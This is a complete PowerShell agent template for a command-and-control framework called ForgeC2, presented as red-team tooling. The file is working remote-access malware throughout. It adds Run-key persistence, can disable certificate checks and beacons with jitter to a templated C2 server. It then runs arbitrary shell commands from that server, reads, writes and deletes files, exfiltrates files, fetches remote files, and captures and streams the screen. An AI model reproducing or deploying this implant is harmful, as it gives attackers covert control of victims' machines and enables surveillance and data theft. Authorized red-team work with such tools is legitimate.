<#
ForgeC2 PowerShell Agent
Professional single-file beacon for authorized red team operations.
This is the full-featured template. Config is injected by the generator (Generate page only).
Do NOT run this file directly — use the C2 Generate Agent feature.
#>

param()

$global:C2URL = "{{.C2URL}}"
$global:Interval = {{.Interval}}
$global:Jitter = {{.Jitter}}
$global:UserAgent = "{{.UserAgent}}"
$global:Persist = {{if .Persist}}$true{{else}}$false{{end}}

$global:AgentUUID = $null
$global:ResultsQueue = @()
$global:FastMode = $false
$global:FastInterval = 1
$global:ScreenStreaming = $false

{{if .SkipTLSVerify}}
# Ignore SSL certificate errors (compatible with Windows PowerShell 5.1 and PowerShell Core)
if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) {
    Add-Type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
}
{{end}}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    if (-not $username) { $username = "unknown" }
    $os = "windows"
    $arch = if ([Environment]::Is64BitProcess) { "amd64" } else { "386" }
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
    if (-not $ip) { $ip = "unknown" }
    
    # Base64 encode like the Go agent for consistency with server handler
    $utf8 = [System.Text.Encoding]::UTF8
    $hostname = [Convert]::ToBase64String($utf8.GetBytes($hostname))
    $username = [Convert]::ToBase64String($utf8.GetBytes($username))
    $ip = [Convert]::ToBase64String($utf8.GetBytes($ip))
    
    return @{hostname=$hostname;username=$username;os=$os;arch=$arch;ip=$ip;encoding="base64"}
}

function Add-Persistence {
    if (-not $global:Persist) { return }
    try {
        $exePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
        if ($exePath -notlike "*.ps1") {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $regPath -Name "ForgeC2" -Value $exePath -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Sleep-Jitter {
    $base = $global:Interval
    if ($global:FastMode) {
        $base = $global:FastInterval
    }
    $jit = $global:Jitter / 100.0
    $variation = [math]::Round($base * $jit * (Get-Random -Minimum -1.0 -Maximum 1.0))
    $sleepTime = [math]::Max(1, $base + $variation)
    Start-Sleep -Seconds $sleepTime
}

{{if eq .Protocol "tcp"}}
function Send-Beacon {
    param($bodyJson)
    try {
        $uri = [System.Uri]$global:C2URL
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($uri.Host, $uri.Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        $request = "POST /api/v1/beacon HTTP/1.1`r`n"
        $request += "Host: $($uri.Host):$($uri.Port)`r`n"
        $request += "Content-Type: application/json`r`n"
        $request += "Content-Length: $($bodyJson.Length)`r`n"
        $request += "User-Agent: $($global:UserAgent)`r`n"
        $request += "Connection: close`r`n`r`n"
        $request += $bodyJson
        
        $writer.Write($request)
        $writer.Flush()
        
        $response = ""
        while ($client.Connected -and ($stream.DataAvailable -or $client.Available -gt 0)) {
            $response += [char]$stream.ReadByte()
        }
        
        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
        
        if ($response -match "\r?\n\r?\n(.*)$") {
            $jsonBody = $matches[1].Trim()
            if ($jsonBody) { return $jsonBody | ConvertFrom-Json }
        }
        return $null
    } catch { return $null }
}
{{else}}
function Send-Beacon {
    param($bodyJson)
    try {
        $headers = @{"Content-Type"="application/json"; "User-Agent"=$global:UserAgent}
        $resp = Invoke-RestMethod -Uri ($global:C2URL + "/api/v1/beacon") -Method Post -Body $bodyJson -Headers $headers -ErrorAction Stop
        return $resp
    } catch {
        Write-Host "[!] Beacon error: $_"
        return $null
    }
}
{{end}}

function Send-ScreenFrame {
    param($data)
    try {
        $body = @{uuid=$global:AgentUUID; data=$data} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri ($global:C2URL + "/api/v1/screen_frame") -Method Post -Body $body -Headers @{"Content-Type"="application/json"} -ErrorAction Stop | Out-Null
    } catch {}
}

function Execute-Task {
    param($task)
    $result = @{task_id=$task.id; type=$task.type; output=""; error=$null}
    try {
        switch ($task.type) {
            "shell" {
                $shellType = "cmd.exe"
                $shellValue = $task.shell
                if ($shellValue -and ($shellValue | Out-String).Trim() -eq "powershell.exe") {
                    $shellType = "powershell.exe"
                }
                
                $cmdStr = $task.command | Out-String
                $cmdStr = $cmdStr.Trim()
                
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = $shellType
                if ($shellType -eq "powershell.exe") {
                    $psi.Arguments = "-NoProfile -NonInteractive -Command " + $cmdStr
                } else {
                    $psi.Arguments = "/C " + $cmdStr
                }
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                $psi.StandardOutputEncoding = [System.Text.Encoding]::Default
                $psi.StandardErrorEncoding = [System.Text.Encoding]::Default
                
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi
                $process.Start() | Out-Null
                
                $stdout = $process.StandardOutput.ReadToEnd()
                $stderr = $process.StandardError.ReadToEnd()
                $process.WaitForExit()
                
                $out = $stdout + $stderr
                $utf8 = [System.Text.Encoding]::UTF8
                $result.output = [Convert]::ToBase64String($utf8.GetBytes($out))
                $result.encoding = "base64"
            }
            "ps" {
                $procs = Get-Process | Select-Object -Property Id, ProcessName, CPU, WorkingSet64 | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 50
                $tab = [char]9
                $nl = [char]10
                $output = "PID" + $tab + "ProcessName" + $tab + "CPU(s)" + $tab + "Memory(MB)" + $nl
                $output += "-" * 60 + $nl
                foreach ($p in $procs) {
                    $memMB = [math]::Round($p.WorkingSet64 / 1MB, 2)
                    $cpuSec = if ($p.CPU) { [math]::Round($p.CPU, 2) } else { 0 }
                    $output += $p.Id.ToString() + $tab + $p.ProcessName + $tab + $cpuSec.ToString() + $tab + $memMB.ToString() + $nl
                }
                $utf8 = [System.Text.Encoding]::UTF8
                $result.output = [Convert]::ToBase64String($utf8.GetBytes($output))
                $result.encoding = "base64"
            }
            "ls" {
                $path = $task.path
                if (-not $path) { $path = $task.command }
                if (-not $path) { $path = "C:\" }
                try {
                    if (-not (Test-Path $path)) {
                        $result.error = "Path not found: $path"
                    } else {
                        $items = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
                        $tab = [char]9
                        $nl = [char]10
                        $output = "Type" + $tab + "Name" + $tab + "Size" + $tab + "Modified" + $nl
                        $output += "-" * 80 + $nl
                        foreach ($item in $items) {
                            $type = if ($item.PSIsContainer) { "DIR" } else { "FILE" }
                            $size = if ($item.PSIsContainer) { "-" } else { $item.Length.ToString() }
                            $modified = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
                            $output += $type + $tab + $item.Name + $tab + $size + $tab + $modified + $nl
                        }
                        $utf8 = [System.Text.Encoding]::UTF8
                        $result.output = [Convert]::ToBase64String($utf8.GetBytes($output))
                        $result.encoding = "base64"
                        $result.path = $path
                    }
                } catch {
                    $result.error = "List failed: $_"
                }
            }
            "delete" {
                $filePath = $task.path
                if (-not $filePath) { $filePath = $task.command }
                if (-not $filePath) {
                    $result.error = "File path required"
                } else {
                    try {
                        if (-not (Test-Path $filePath)) {
                            $result.error = "File not found: $filePath"
                        } else {
                            Remove-Item -Path $filePath -Force -Recurse -ErrorAction Stop
                            $result.output = "Deleted: $filePath"
                            $result.path = $filePath
                        }
                    } catch {
                        $result.error = "Delete failed: $_"
                    }
                }
            }
            "read" {
                $filePath = $task.path
                if (-not $filePath) { $filePath = $task.command }
                if (-not $filePath) {
                    $result.error = "File path required"
                } else {
                    try {
                        if (-not (Test-Path $filePath)) {
                            $result.error = "File not found: $filePath"
                        } else {
                            $content = Get-Content -Path $filePath -Raw -ErrorAction Stop
                            $utf8 = [System.Text.Encoding]::UTF8
                            $result.output = [Convert]::ToBase64String($utf8.GetBytes($content))
                            $result.encoding = "base64"
                            $result.path = $filePath
                        }
                    } catch {
                        $result.error = "Read failed: $_"
                    }
                }
            }
            "upload" {
                # Two modes:
                # 1. Server pushes file (Data or Shell contains base64 data, Path or Command = target path)
                # 2. Agent exfils file (no Data/Shell, Path or Command = path to read)
                $path = $task.path
                if (-not $path) { $path = $task.command }
                $b64 = $task.data
                if (-not $b64) { $b64 = $task.shell }
                if ($b64) {
                    # push from operator
                    try {
                        $bytes = [Convert]::FromBase64String($b64)
                        [System.IO.File]::WriteAllBytes($path, $bytes)
                        $result.output = "File written to: $path"
                        $result.path = $path
                    } catch {
                        $result.error = "Upload (write) failed: $_"
                    }
                } else {
                    # exfil to server
                    $filePath = $path
                    if (-not $filePath) {
                        $result.error = "File path required"
                    } else {
                        try {
                            if (-not (Test-Path $filePath)) {
                                $result.error = "File not found: $filePath"
                            } else {
                                $bytes = [System.IO.File]::ReadAllBytes($filePath)
                                $result.output = [Convert]::ToBase64String($bytes)
                                $result.filename = (Split-Path $filePath -Leaf)
                                $result.size = $bytes.Length
                                $result.encoding = "base64"
                            }
                        } catch {
                            $result.error = "Upload (read) failed: $_"
                        }
                    }
                }
            }
            "download" {
                if ($task.command -like "http*") {
                    # URL download: Command = url, Shell or Path = destPath
                    $fileUrl = $task.command
                    $destPath = $task.shell
                    if (-not $destPath) { $destPath = $task.path }
                    if (-not $destPath) {
                        $destPath = Split-Path $fileUrl -Leaf
                    }
                    try {
                        $client = New-Object System.Net.WebClient
                        $client.DownloadFile($fileUrl, $destPath)
                        $result.output = "File downloaded to: $destPath"
                        $result.path = $destPath
                    } catch {
                        $result.error = "Download failed: $_"
                    }
                } else {
                    # Local file exfil
                    $filePath = $task.path
                    if (-not $filePath) { $filePath = $task.command }
                    if (-not $filePath) {
                        $result.error = "File path required"
                    } else {
                        try {
                            $bytes = [System.IO.File]::ReadAllBytes($filePath)
                            $result.output = [Convert]::ToBase64String($bytes)
                            $result.filename = (Split-Path $filePath -Leaf)
                            $result.size = $bytes.Length
                            $result.encoding = "base64"
                            $result.path = $filePath
                        } catch {
                            $result.error = "Download (exfil) failed: $_"
                        }
                    }
                }
            }
            "kill" {
                $result.output = "Agent terminating..."
                Start-Sleep -Milliseconds 300
                [Environment]::Exit(0)
            }
            "screenshot" {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    try {
                        Add-Type @"
using System; using System.Runtime.InteropServices;
public class ForgeDpi {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("shcore.dll")] public static extern int SetProcessDpiAwareness(int v);
}
"@
                        [ForgeDpi]::SetProcessDpiAwareness(2) | Out-Null
                    } catch { [ForgeDpi]::SetProcessDPIAware() | Out-Null }
                    
                    $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
                    $bmp = New-Object System.Drawing.Bitmap($vs.Width, $vs.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                    $graphics.CopyFromScreen($vs.X, $vs.Y, 0, 0, $vs.Size)
                    $graphics.Dispose()
                    $stream = New-Object System.IO.MemoryStream
                    $bmp.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
                    $bmp.Dispose()
                    $bytes = $stream.ToArray()
                    $stream.Dispose()
                    $result.output = [Convert]::ToBase64String($bytes)
                    $result.encoding = "base64"
                    $result.size = $bytes.Length
                    $result.path = ""  # full virtual screen
                    $global:FastMode = $true
                } catch {
                    $result.error = "Screenshot failed: $_"
                }
            }
            "screen_stream_start" {
                $global:ScreenStreaming = $true
                $result.output = "screen stream started"
            }
            "screen_stream_stop" {
                $global:ScreenStreaming = $false
                $result.output = "screen stream stopped"
            }
            default { $result.error = "Unknown task type: $($task.type)" }
        }
    } catch { $result.error = $_.Exception.Message }
    return $result
}

function Do-Beacon {
    $info = Get-SystemInfo
    $body = @{uuid=$global:AgentUUID; info=$info; results=$global:ResultsQueue} | ConvertTo-Json -Depth 5 -Compress
    $body = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($body))
    $global:ResultsQueue = @()
    $resp = Send-Beacon -bodyJson $body
    if (-not $resp) { 
        $global:FastMode = $false
        return 
    }
    $global:FastMode = $false
    if ($resp.tasks) {
        foreach ($task in $resp.tasks) {
            if ($task.type -eq "screenshot") {
                $global:FastMode = $true
            }
            $res = Execute-Task -task $task
            if ($res.output -or $res.error) {
                $resultBody = @{uuid=$global:AgentUUID; results=@($res)} | ConvertTo-Json -Depth 5 -Compress
                $resultBody = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($resultBody))
                $resp2 = Send-Beacon -bodyJson $resultBody
                if ($task.type -eq "screenshot" -and $resp2 -and $resp2.tasks) {
                    Continue-Screenshot-Loop -resp $resp2
                }
            }
        }
    }

    if ($global:ScreenStreaming) {
        try {
            Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
            $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bmp = New-Object System.Drawing.Bitmap($vs.Width, $vs.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
            $graphics.CopyFromScreen($vs.X, $vs.Y, 0, 0, $vs.Size)
            $graphics.Dispose()
            $stream = New-Object System.IO.MemoryStream
            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 60)
            $jpegEncoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
            $bmp.Save($stream, $jpegEncoder, $encoderParams)
            $bmp.Dispose()
            $bytes = $stream.ToArray()
            $stream.Dispose()
            $b64 = [Convert]::ToBase64String($bytes)
            Send-ScreenFrame -data $b64
            Start-Sleep -Milliseconds 100
        } catch {}
    }
}

function Continue-Screenshot-Loop {
    param($resp)
    while ($resp -and $resp.tasks) {
        foreach ($task in $resp.tasks) {
            if ($task.type -ne "screenshot") {
                $res = Execute-Task -task $task
                if ($res.output -or $res.error) {
                    $resultBody = @{uuid=$global:AgentUUID;results=@($res)} | ConvertTo-Json -Depth 5 -Compress
                    $resultBody = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($resultBody))
                    $resp = Send-Beacon -bodyJson $resultBody
                }
                return
            }
            $res = Execute-Task -task $task
            if (-not $res.output -and $res.error) {
                $resultBody = @{uuid=$global:AgentUUID;results=@($res)} | ConvertTo-Json -Depth 5 -Compress
                $resultBody = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($resultBody))
                Send-Beacon -bodyJson $resultBody | Out-Null
                return
            }
            $resultBody = @{uuid=$global:AgentUUID;results=@($res)} | ConvertTo-Json -Depth 5 -Compress
            $resultBody = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($resultBody))
            $resp = Send-Beacon -bodyJson $resultBody
        }
    }
}

# ============ MAIN ============
Write-Host "[ForgeC2] PowerShell Agent starting..." -ForegroundColor Cyan

Add-Persistence

$uuidFile = Join-Path $env:TEMP "forgec2_uuid.txt"
if (Test-Path $uuidFile) { 
    $global:AgentUUID = [IO.File]::ReadAllText($uuidFile).Trim() 
} else { 
    $global:AgentUUID = [guid]::NewGuid().ToString()
    [IO.File]::WriteAllText($uuidFile, $global:AgentUUID) 
}

Write-Host "[*] Agent UUID: $global:AgentUUID" -ForegroundColor Green
Write-Host "[*] C2: $global:C2URL | Interval: $($global:Interval)s | Jitter: $($global:Jitter)%" -ForegroundColor DarkGray

while ($true) {
    Do-Beacon
    Sleep-Jitter
}
